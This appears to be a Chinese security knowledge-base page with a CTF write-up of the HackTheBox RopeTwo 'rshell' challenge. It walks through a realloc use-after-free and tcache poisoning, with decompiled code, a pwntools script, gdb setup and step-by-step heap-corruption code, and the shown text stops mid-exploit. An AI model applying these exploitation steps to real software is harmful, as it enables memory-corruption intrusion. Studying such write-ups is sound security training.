---
title: UAF、tcache 与分配器状态
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/heap/
categories:
- 二进制安全
- 堆利用
tags:
- 知识库
- 堆利用
- tcache
- UAF
- libc
- 格式化字符串
description: 堆利用首先需要理解对象生命周期和分配器状态。本章保留释放、重分配、别名指针和泄漏位置的原始顺序，再对照最后的 Python 脚本和远程结果。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

堆利用首先需要理解对象生命周期和分配器状态。本章保留释放、重分配、别名指针和泄漏位置的原始顺序，再对照最后的 Python 脚本和远程结果。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/heap/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Little Tommy 用 memo 重用已释放账户，字段布局决定覆盖内容。

RopeTwo rshell 的 realloc 与不同 bin 间距改变原语的可组合方式。

Toxin 的两个解法保留格式化泄漏、tcache poisoning 和 libc hook 的各自偏移。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [realloc 状态与 tcache 指针](#case-hackthebox-rope2-rshell-exploit) | hackthebox-rope2-rshell-exploit | 堆利用、tcache、libc |
| [悬空账户指针与 memo 重用](#case-little-tommy) | little-tommy | UAF、堆利用 |
| [格式化泄漏与 tcache poisoning](#case-toxin) | toxin | 堆利用、tcache、UAF、格式化字符串 |

<a id="case-hackthebox-rope2-rshell-exploit"></a>

## realloc 状态与 tcache 指针

rshell 的编辑和分配状态使多个句柄指向同一块内存。原记录保留不同 bin 大小、main_arena 泄漏和脚本重构后的最终布局。

<p class="kb-provenance">来源 hackthebox-rope2-rshell-exploit · 原记录 2021-02-18 · 58 个代码块 · 3 处图片引用</p>

<details class="kb-evidence" id="record-hackthebox-rope2-rshell-exploit">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start hackthebox-rope2-rshell-exploit -->

#### 前言

此篇文章专门记录hack the box - ropetwo机器中获取user权限的pwn rshell部分, Tcache堆利用。



#### 下载binary文件分析

``` bash
chromeuser@rope2:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/rshell
/usr/bin/mount
/usr/bin/at
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
/usr/bin/sudo
chromeuser@rope2:~$ /usr/bin/rshell
$ id
uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)
$ whoami
r4j
$ ls
$ pwd
rshell: pwd: command not found
$ ^C
chromeuser@rope2:~$
```

下载rshell文件

``` bash
chromeuser@rope2:/usr/bin$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.14.22 - - [17/Feb/2021 19:33:30] "GET /rshell HTTP/1.1" 200 -
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# wget http://10.10.10.196:8001/rshell
--2021-02-17 14:30:38--  http://10.10.10.196:8001/rshell
正在连接 10.10.10.196:8001... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：14312 (14K) [application/octet-stream]
正在保存至: “rshell”

rshell                             100%[===============================================================>]  13.98K  45.0KB/s  用时 0.3s    

2021-02-17 14:30:39 (45.0 KB/s) - 已保存 “rshell” [14312/14312])

┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# ls -la rshell
-rw-r--r-- 1 root root 14312  2月 24  2020 rshell
```

#### 主要循环

使用[Ghidra](https://ghidra-sre.org/)打开看了看。在搜索字符串“command not found” 时，定位在0x1019be处的函数，将其命名为process_input。调用这个函数的函数是0x101b93，将调用main_loop

使用ghidra重命名函数名和变量名之后的伪代码如下所示，便于阅读:

``` bash
void main_loop(void)

{
  ssize_t i;
  long in_FS_OFFSET;
  byte in_buf [200];
  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init_stuff();
  memset(in_buf,0,200);
  do {
    do {
      printf("$ ");
      i = read(0,in_buf,199);
    } while ((int)i < 2);
    in_buf[(int)i + -1] = 0;
    process_input(in_buf);
  } while( true );
}
```

它初始化一些东西，然后进入一个无限循环，打印$，读取最多200个字符，null结束输入，并将其传递给process_input, process_input根据输入中的前几个字符采取行动:

| 输入开始 | 采取动作 |
| :-----| :---- |
| “ls “ | 调用 do_ls [0x1015cf] |
| “add “ | 调用 do_add(user_input[4:]) [0x101345] |
| “rm “ | 调用 do_rm(user_input[3:]) [0x10166d] |
| “echo “ | 输出字符串的其余部分 |
| “edit “ | 调用 do_edit(user_input[5:]) [0x1017d8] |
| “whoami” | 打印 “r4j” |
| “id” | 打印 “uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)” |
| 其它 | 打印 “rshell: %s: command not found” |

#### Commands

该程序一次最多保存两个“文件”，其中file1 on是0x104060的全局文件，file2是0x104130。对于每个文件，前8个字节包含一个指向用户提供的包含文件内容的malloc创建的堆缓冲区的指针。有一种检查只允许大小小于或等于0x70字节。最后一个0xC8(200)字节保存文件的名称。add函数确保第二个文件不能与现有文件同名，并且不能添加超过两个文件。这将是利用该二进制文件的最大限制，因为每次只使用两个文件就很难将堆操作到您想要的位置。

ls命令在两个槽上循环，如果指针非空，它将打印文件的名称。它不打印任何内容，而且无法合法地获取文件的内容，这为开发提供了另一个需要克服的主要障碍。

rm命令在两个槽上循环，查看偏移量为8的字符串，如果字符串与输入匹配，则将字符串文件名全部设置为null，释放包含内容的堆内存，并将指针设置为null。

edit命令是漏洞存在的地方。

使用ghidra将FUN_001017d8函数中各个变量命名成如下形式，便于阅读:

``` bash
void do_edit(char *param_1)

{
  int strcmp_res;
  long in_FS_OFFSET;
  uint read_size;
  int i;
  void *new_buf;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  i = 0;
  do {
    if (1 < i) {
      puts("rshell: No such file or directory");
LAB_001019a8:
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    strcmp_res = strcmp(param_1,(char *)((long)i * 0xd0 + 0x104068));
    if ((strcmp_res == 0) && ((&item_array)[(long)i * 0x1a] != 0)) {
      read_size = 0;
      printf("size: ");
      __isoc99_scanf(&"%u",&read_size);
      getchar();
      if (read_size < 0x71) {
        new_buf = realloc((void *)(&item_array)[(long)i * 0x1a],(ulong)read_size);
        if (new_buf == (void *)0x0) {
          puts("Error");
        }
        else {
          *(void **)(&item_array + (long)i * 0x1a) = new_buf;
          printf("content: ");
          read(0,(void *)(&item_array)[(long)i * 0x1a],(ulong)read_size);
        }
      }
      else {
        puts("Memory Error!");
      }
      goto LAB_001019a8;
    }
    i = i + 1;
  } while( true );
}
```

这个循环首先检查i是否大于1，这表示它已经遍历了两个配置，但没有找到要编辑的匹配文件，在这种情况下，它打印一条错误消息并退出。然后，它检查当前项，看看名称是否与输入匹配，如果匹配，它会提示输入一个新的大小(确保小于0x71)，并在现有缓冲区上使用realloc。然后读取并存储内容，并完成。

#### 配置

 - 利用脚本

为了与这个二进制文件交互，使用一些工具。首先，启动一个Python利用脚本。首先，它将只有与rshell中的各种命令交互的方法(这个脚本假设我的ssh公钥在chromeuser的authorized_keys文件中):

 - exp.py

``` bash
#!/usr/bin/env python3

import pdb
from pwn import *


prompt = '$ '

def ls():
    p.sendline('ls')
    res = p.recvuntil(prompt)
    for line in res.split(b'\n')[:-1]:
        print(line.decode())

def add(name, size, content='x'):
    p.sendline(f'add {name}')
    res = p.recvuntil(('size: ', prompt))
    if res.endswith(prompt.encode()): 
        pdb.set_trace()
        return
    p.sendline(f'{size}')
    if size > 0:
        p.recvuntil('content: ')
        p.sendline(content)
    res = p.recvuntil(prompt)
    return res 
    
def rm(name, wait=True):
    p.sendline(f'rm {name}')
    if wait:
        p.recvuntil(prompt)

def edit(name, size, content='x'):
    p.sendline(f'edit {name}')
    res = p.recvuntil(('size: ', prompt))
    if res == prompt: 
        pdb.set_trace()
        return
    p.sendline(f'{size}')
    if size > 0:
        p.recvuntil('content: ')
        p.send(content)
    p.recvuntil(prompt)


rshell = ELF('./rshell')
libc = ELF('./libc.so.6-ropetwo')

if args.REMOTE:
    remote = ssh(host='10.10.10.196', user='chromeuser', keyfile='/root/keys/ed25519_gen')

if args.REMOTE:
    p = remote.run('rshell')
else:
    p = process('./rshell')
p.recvuntil('$ ')
x=1
```

 - Libc

使用与RopeTwo相同的libc

``` bash
chromeuser@rope2:~$ ldd /usr/bin/rshell
        linux-vdso.so.1 (0x00007ffd1df75000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbe10a9c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fbe10c96000)
```

使用scp来获取libc.so.6, (在我的主机把它命名为libc.so.6-ropetwo)和ld-linux-x86-64.so.2。

想要libc的debug符号，所以使用与[PlayerTwo](https://0xdf.gitlab.io/2020/06/27/htb-playertwo.html#fix-heapinfo)相同的过程:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# proxychains wget https://answers.launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
--2021-02-17 15:53:59--  https://answers.launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb
正在解析主机 answers.launchpad.net (answers.launchpad.net)... 224.0.0.1
正在连接 answers.launchpad.net (answers.launchpad.net)|224.0.0.1|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  answers.launchpad.net:443  ...  OK
已连接。
已发出 HTTP 请求，正在等待回应... 303 See Other
位置：https://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb [跟随至新的 URL]
--2021-02-17 15:54:03--  https://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb
正在解析主机 launchpadlibrarian.net (launchpadlibrarian.net)... 224.0.0.2
正在连接 launchpadlibrarian.net (launchpadlibrarian.net)|224.0.0.2|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  launchpadlibrarian.net:443  ...  OK
已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：5698988 (5.4M) [application/x-debian-package]
正在保存至: “libc6-dbg_2.29-0ubuntu2_amd64.deb”

libc6-dbg_2.29-0ubuntu2_amd64.deb  100%[===============================================================>]   5.43M  1.96MB/s  用时 2.8s    

2021-02-17 15:54:09 (1.96 MB/s) - 已保存 “libc6-dbg_2.29-0ubuntu2_amd64.deb” [5698988/5698988])
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# dpkg --fsys-tarfile libc6-dbg_2.29-0ubuntu2_amd64.deb | tar xOf - ./usr/lib/debug/lib/x86_64-linux-gnu/libc-2.29.so > libc-2.29.so
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# eu-unstrip libc.so.6-ropetwo libc-2.29.so
──(root💀kali)-[~/hackthebox/machine/rope2]
└─# mv libc-2.29.so{,-debug}
```

现在将使用patchelf告诉rshell使用这些:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./rshell
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# patchelf --replace-needed libc.so.6 ./libc-2.29.so-debug  ./rshell
```

本地rshell正在使用这两个库:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# ldd rshell
        linux-vdso.so.1 (0x00007ffc0cdee000)
        ./libc-2.29.so-debug (0x00007f0e2ec0c000)
        ./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f0e2ee00000)
```

 - gdb

对于初始环境，在主机上运行

``` bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

来转向ASLR。这将允许在想要的地方放一个断点，而不必每次都调整。

为了跟踪堆，使用[Pwngdb](https://github.com/scwuaptx/Pwngdb)(不要与pwndbg混淆)。heapinfo命令打印出各种freed bins的漂亮视图。

将所有这些放在一起，为gdb创建了以下初始化文件:

``` bash
set pagination off
b *0x0000555555555c2b
command 1
echo -----------------------------------\n
set $cont1p = *((long int*)0x555555558060)
set $cont1 = *(char[]*)$cont1p
set $name1 = *(char[]*) 0x555555558068
printf "[0x%08x%08x] %-8s: %s\n", $cont1p >> 32, $cont1p, $name1, $cont1
set $cont2p = *((long int*)0x555555558130)
set $cont2 = *(char[]*)$cont2p
set $name2 = *(char[]*) 0x555555558138
printf "[0x%08x%08x] %-8s: %s\n", $cont2p >> 32, $cont2p, $name2, $cont2
echo -----------------------------------\n
x/48xg 0x55555555c2f0
echo -----------------------------------\n
heapinfo
continue
end
```

这将在读取下一个命令之前，在0xc2b处设置一个断点。在这个断点处，它将计算出两个文件的名称和内容，并打印结果。然后，它将从堆中打印48个单词在工作的区域(确实修改了这个地址，因为关注的是堆的不同部分)。最后，它将运行heapinfo来显示bins。然后它会继续。通过这种方式，可以逐步遍历Python脚本并从那里运行函数，gdb窗口将继续在每个命令之后打印状态。

确实在~/.gdbinit文件中注释了Peda的来源，因为无法让它停止在每个break上打印上下文，这会将正在打印的所有信息从屏幕上删除。

#### 放在一起

现在，启动Python脚本，Python调试器(pdb)设置为停止在最后一行，以便可以继续运行命令:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# python3 -mpdb -c 'b 57' -c c exp.py
Breakpoint 1 at /root/hackthebox/machine/rope2/exp.py:57
[*] '/root/hackthebox/machine/rope2/rshell'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/root/hackthebox/machine/rope2/libc.so.6-ropetwo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './rshell': pid 4649
> /root/hackthebox/machine/rope2/exp.py(57)<module>()
-> x=1
(Pdb)
```

现在在另一个面板中，将附加gdb，然后告诉它继续:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# gdb -q -p $(pidof rshell) --command=gdb-rshell.init
Attaching to process 4649
Reading symbols from /root/hackthebox/machine/rope2/rshell...
(No debugging symbols found in /root/hackthebox/machine/rope2/rshell)
Reading symbols from ./libc-2.29.so-debug...
Reading symbols from ./ld-linux-x86-64.so.2...
(No debugging symbols found in ./ld-linux-x86-64.so.2)
[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00 
RBX: 0x0 
RCX: 0x7ffff7eebf81 (<__GI___libc_read+17>:     cmp    rax,0xfffffffffffff000)
RDX: 0xc7 
RSI: 0x7fffffffdf40 --> 0x0 
RDI: 0x0 
RBP: 0x7fffffffe010 --> 0x555555555c30 (push   r15)
RSP: 0x7fffffffdf28 --> 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)
RIP: 0x7ffff7eebf81 (<__GI___libc_read+17>:     cmp    rax,0xfffffffffffff000)
R8 : 0x2 
R9 : 0x7ffff7fcb5c0 (0x00007ffff7fcb5c0)
R10: 0x3 
R11: 0x246 
R12: 0x555555555150 (xor    ebp,ebp)
R13: 0x7fffffffe0f0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7eebf7b <__GI___libc_read+11>:        jne    0x7ffff7eebf90 <__GI___libc_read+32>
   0x7ffff7eebf7d <__GI___libc_read+13>:        xor    eax,eax
   0x7ffff7eebf7f <__GI___libc_read+15>:        syscall 
=> 0x7ffff7eebf81 <__GI___libc_read+17>:        cmp    rax,0xfffffffffffff000
   0x7ffff7eebf87 <__GI___libc_read+23>:        ja     0x7ffff7eebfe0 <__GI___libc_read+112>
   0x7ffff7eebf89 <__GI___libc_read+25>:        ret    
   0x7ffff7eebf8a <__GI___libc_read+26>:        nop    WORD PTR [rax+rax*1+0x0]
   0x7ffff7eebf90 <__GI___libc_read+32>:        push   r12
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf28 --> 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)
0008| 0x7fffffffdf30 --> 0x7ffff7ffeac0 --> 0x7ffff7ffe9f0 --> 0x7ffff7ffe758 --> 0x7ffff7ffe730 --> 0x7ffff7fd0000 (jg     0x7ffff7fd0047)
0016| 0x7fffffffdf38 --> 0x0 
0024| 0x7fffffffdf40 --> 0x0 
0032| 0x7fffffffdf48 --> 0x0 
0040| 0x7fffffffdf50 --> 0x0 
0048| 0x7fffffffdf58 --> 0x0 
0056| 0x7fffffffdf60 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007ffff7eebf81 in __GI___libc_read (fd=0x0, buf=0x7fffffffdf40, nbytes=0xc7) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: 没有那个文件或目录.
Breakpoint 1 at 0x555555555c2b
```

当添加一个文件:

``` bash
(Pdb) add('test', 0x60, 'this is a test') 
b'$ '
(Pdb)
```

gdb更新：

``` bash
[0x000055555555b260] test    : this is a test

[0x0000000000000000]         : (null)
-----------------------------------
0x55555555c2f0: 0x0000000000000000      0x0000000000000000
0x55555555c300: 0x0000000000000000      0x0000000000000000
0x55555555c310: 0x0000000000000000      0x0000000000000000
0x55555555c320: 0x0000000000000000      0x0000000000000000
0x55555555c330: 0x0000000000000000      0x0000000000000000
0x55555555c340: 0x0000000000000000      0x0000000000000000
0x55555555c350: 0x0000000000000000      0x0000000000000000
0x55555555c360: 0x0000000000000000      0x0000000000000000
0x55555555c370: 0x0000000000000000      0x0000000000000000
0x55555555c380: 0x0000000000000000      0x0000000000000000
0x55555555c390: 0x0000000000000000      0x0000000000000000
0x55555555c3a0: 0x0000000000000000      0x0000000000000000
0x55555555c3b0: 0x0000000000000000      0x0000000000000000
0x55555555c3c0: 0x0000000000000000      0x0000000000000000
0x55555555c3d0: 0x0000000000000000      0x0000000000000000
0x55555555c3e0: 0x0000000000000000      0x0000000000000000
0x55555555c3f0: 0x0000000000000000      0x0000000000000000
0x55555555c400: 0x0000000000000000      0x0000000000000000
0x55555555c410: 0x0000000000000000      0x0000000000000000
0x55555555c420: 0x0000000000000000      0x0000000000000000
0x55555555c430: 0x0000000000000000      0x0000000000000000
0x55555555c440: 0x0000000000000000      0x0000000000000000
0x55555555c450: 0x0000000000000000      0x0000000000000000
0x55555555c460: 0x0000000000000000      0x0000000000000000
-----------------------------------
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0                                                                                                                 
(0x40)     fastbin[2]: 0x0                                                                                                                 
(0x50)     fastbin[3]: 0x0                                                                                                                 
(0x60)     fastbin[4]: 0x0                                                                                                                 
(0x70)     fastbin[5]: 0x0                                                                                                                 
(0x80)     fastbin[6]: 0x0                                                                                                                 
(0x90)     fastbin[7]: 0x0                                                                                                                 
(0xa0)     fastbin[8]: 0x0                                                                                                                 
(0xb0)     fastbin[9]: 0x0                                                                                                                 
                  top: 0x55555555b2c0 (size : 0x20d40)                                                                                     
       last_remainder: 0x0 (size : 0x0)                                                                                                    
            unsortbin: 0x0
```

#### 注释

开发这种漏洞利用程序太疯狂了。每次进入下一个步骤时，都必须返回并完全重新构建前一个，移动方块，尝试不同大小的bins。不可能在本文中展示所有这些步骤，但是，将尝试在完成的脚本中完成不同的目标，并展示如何使用脚本操作堆来完成所需要的任务。但是值得补充的是，当第一次在堆上获得libc地址时，代码看起来完全不同。当进入下一个步骤时，将使用相同的通用技术，但需要完全重新设计不同bins的间距和大小，以完成已经实现的目标和下一个目标。

#### 弱点

 - 描述

这里的漏洞在于编辑命令中的realloc，以及它如何根据当前大小和新大小做出反应:

| 大小比较 | 采取动作 |
| :-----| :---- |
| new_size == 0 | free(buffer), return null |
| new_size > 0 && new_size < orig_size | 分成两个块，返回相同的地址和更小的块，并在旧块的末尾留下空闲块 |
| new_size > 0 && new_size > orig_size | 释放旧块，为更大的块分配新块，并返回该地址。 |

上面的代码检查返回值是否为null，但随后只打印一条消息，而不更改存储的指针。这会给用户留下一个指向已释放内存的指针，这是很糟糕的。

 - 例子

为了看到这一点，将运行以下代码:

``` bash
(Pdb) add('1', 0x50)
b'$ '
(Pdb) add('2', 0x50)
b'$ '
(Pdb) rm('1')
(Pdb) edit('2', 0)
```

这样就剩下了以下内容(<-- 由我添加):

``` bash
-----------------------------------
[0x0000000000000000]         : (null)
[0x000055555555c2c0] 2       : `UUUU                        <-- still have pointer to chunk2
-----------------------------------
0x55555555c250: 0x0000000000000000      0x0000000000000061  <-- freed chunk 1
0x55555555c260: 0x0000000000000000      0x000055555555c010  <-- tcache pointer null, key
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000000
0x55555555c290: 0x0000000000000000      0x0000000000000000
0x55555555c2a0: 0x0000000000000000      0x0000000000000000
0x55555555c2b0: 0x0000000000000000      0x0000000000000061  <-- freed chunk 2
0x55555555c2c0: 0x000055555555c260      0x000055555555c010  <-- tcache pointer to freed 1, key
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000000000
0x55555555c300: 0x0000000000000000      0x0000000000000000
0x55555555c310: 0x0000000000000000      0x0000000000020cf1  <-- end of heap
...[snip]...
-----------------------------------
...[snip]...
                  top: 0x55555555c310 (size : 0x20cf0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x60)   tcache_entry[4](2): 0x55555555c2c0 --> 0x55555555c260  <-- both chunks in tcache list
```

这是可利用的，因为还有一个指向edit2的指针，尽管它已经被释放了。这意味着可以通过编辑2来更改tcache链表。

#### 在堆上得到libc

 - 策略

从这个小漏洞到代码执行的路径并不明显。因为ASLR，需要做的第一件事就是从libc泄露一些信息。要做到这一点，首先需要从libc获得一些东西到堆上。当释放这些bins时，它们将进入tcache，这是一堆从libc开始的单链表，然后列表容器中的每一项都是指向下一项的指针。但其他类型是双链表。这意味着每个节点既指向它后面的节点，也指向它前面的节点，因此第一个节点在libc中具有起始节点的地址。可以通过用7个给定大小的bins填充tcache，然后再释放一个bin，将一些东西放入未排序的bins中。

这将需要大量的跳跃，当被限制在只有两个“文件”的程序在同一时间。

 - 间距

ASLR和Full RELRO将改变每个单词除了低12位以外的所有内容。可以一遍又一遍地运行程序，只要以相同的顺序定义相同的块，每个地址的低12位将是相同的。这意味着可以找到一些地方，在那里可以只覆盖地址中的低字节，从而在不知道高字节的情况下更改它。这也意味着有些时候想从某个特定的空间开始。如果在0x2e0处创建了一个假块，并且不能覆盖当前指向0x320的指针。但是如果在开始时只向堆中添加一小块，并将它们移到0x310和0x350，现在可以用0x10覆盖较低的0x50。

 - 假块

创建一个假的重叠块，它可以写入下一个块的元数据。可以在上面的示例中选择，但不是第一个块写入任何感兴趣的内容，而是让它写入一些看起来像堆元数据的内容，例如，0x61:

``` bash
add('A', 0x40, p64(0)*5 + p64(0x61) + p64(0))   # A at 260 in f1
add('B', 0x40)                                  # B at 2b0 in f2
```

当运行这个时，堆看起来像:

``` bash
0x55555555c250: 0x0000000000000000      0x0000000000000051  <-- A meta
0x55555555c260: 0x0000000000000000      0x0000000000000000
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000061  <-- data, but looks like heap meta
0x55555555c290: 0x0000000000000000      0x000000000000000a
0x55555555c2a0: 0x0000000000000000      0x0000000000000051  <-- B meta
0x55555555c2b0: 0x0000000000000a78      0x0000000000000000  <-- B data
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000020d11  <-- end of heap
```

释放A，然后释放B，把它编辑为0。然后在添加另一个0x40 bin时，将使两个文件指向同一个位置。从这里开始，移除第一个B将会进入想要攻击的地方:

``` bash
rm('A')                                         # A in 0x50 tcache, f1 empty
edit('B', 0)                                    # B -> A in 0x50 tcache, f2 still B
add('B2', 0x40)                                 # A in 0x50 tcache, f1 & f2 -> B
rm('B')                                         # B -> A in 0x50 tcache, f1 -> B
```

堆循环如下:

``` bash
0x55555555c250: 0x0000000000000000      0x0000000000000051  <-- A meta
0x55555555c260: 0x0000000000000000      0x000055555555c010  <-- A pointer to next (null) and key
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000061  <-- fake chunk
0x55555555c290: 0x0000000000000000      0x000000000000000a
0x55555555c2a0: 0x0000000000000000      0x0000000000000051  <-- B meta
0x55555555c2b0: 0x000055555555c260      0x000055555555c010  <-- pointer to A and key
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000020d11
```

当现在用一个字符编辑B2, 0x90，它将覆盖tcache指针:

``` bash
edit('B2', 0x40, '\x90')                        # B -> fake1 in 0x50 tcache, f1 -> B
```
Heap:

``` bash
0x55555555c250: 0x0000000000000000      0x0000000000000051
0x55555555c260: 0x0000000000000000      0x000055555555c010
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000061
0x55555555c290: 0x0000000000000000      0x000000000000000a
0x55555555c2a0: 0x0000000000000000      0x0000000000000051
0x55555555c2b0: 0x000055555555c290      0x000055555555c010  <-- now points to fake chunk
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000000
0x55555555c2e0: 0x0000000000000000      0x0000000000000000
0x55555555c2f0: 0x0000000000000000      0x0000000000020d11
```

heapinfo也显示了这个:

``` bash
(0x50)   tcache_entry[3](2): 0x55555555c2b0 --> 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) )
```

如果想要访问这个块，首先需要去掉2b0。不能把它拿出来释放，否则它会回到原来的地方。所以会得到它，把它编辑成更小的大小，然后释放它，让两个更小的块进入tcache，留下假块准备好被使用。

``` bash
add('B3', 0x40)                                 # fake in 0x50 tcache, f2 -> B
edit('B3', 0x20)                                # B-end in 0x20 tcache
rm('B3')                                        # B in 0x30 tcache
```

现在，将添加一个0x40条目，它将返回290，可以使用它覆盖到b中。在这样做之前，有另一个问题。想释放B2，但不能，因为它会返回一个双自由错误。它正在检查size元数据后面0x10的键，所以需要更改它。幸运的是，有了新的重叠部分。因此，将创建它，使它保持0x51不变，为下一个tcache添加一个null，并更改键。

``` bash
add('fake1', 0x40, p64(0)*3 + p64(0x51) + p64(0))
```

现在堆显示key不再匹配坏值:

``` bash
0x55555555c250: 0x0000000000000000      0x0000000000000051
0x55555555c260: 0x0000000000000000      0x000055555555c010
0x55555555c270: 0x0000000000000000      0x0000000000000000
0x55555555c280: 0x0000000000000000      0x0000000000000061
0x55555555c290: 0x0000000000000000      0x0000000000000000
0x55555555c2a0: 0x0000000000000000      0x0000000000000051
0x55555555c2b0: 0x0000000000000000      0x000055555555000a  <-- no pointer and key ends in "\x00\x0a" and not "\xc0\x10"
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000021
0x55555555c2e0: 0x0000000000000000      0x000055555555c010
0x55555555c2f0: 0x0000000000000000      0x0000000000020d11
```

将释放B2和fake1，它们都进入tcache，需要一种向任意地址写入的方法时，可以在最后使用它们。

``` bash
rm('fake1')
rm('B2')
```

tcache现在看起来像:

``` bash
(0x20)   tcache_entry[0](1): 0x55555555c2e0
(0x30)   tcache_entry[1](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )
```

 - 第二假块

现在，将用大致相同的方式创建另一个假块 (在间隔一些时间之后):

``` bash
add('x', 0x30)                                  # add for spacing, but used later
rm('x')

add('C', 0x60)   # create block to be freed and steal pointer in tcache - C = 340
add('D', 0x70, p64(0)*5 + p64(0xa1) + p64(0)) # create block and fake block to put fake block meta in place - D = 3b0
rm('D') # D in tcache 0x80
add('E', 0x60, p64(0x21)*11)   # create second 0x60, E, and spray with 0x21 for next block meta fake later, E = 430
rm('C')               # f1 empty, C in 0x70 tcache
edit('E', 0)      # slot 2 -> E, E->C in 0x70 tcache
add('E2', 0x60)  # slots 1 and 2 -> E, C in 0x70 tcache
rm('E')               # slot 1 -> E, E -> C in 0x70 tache
edit('E2', 0x60, b'\xe0') # edit tcache pointer, C -> fake2 in 0x70 tcache

# next three fetch C from tcache, and get rid of it without putting it back in 0x70 tcache
add('E3', 0x60)   # fetch E, fake in 0x70 tcache
edit('E3', 0x20)  # E-end in 0x30 tcache
rm('E3')          # E in 0x50 tcache

add('fake2', 0x60, p64(0)*9 + p64(0x31) + p64(0))   # get fake block, change key for E
rm('E2') # C
add('B', 0x70) # B
```

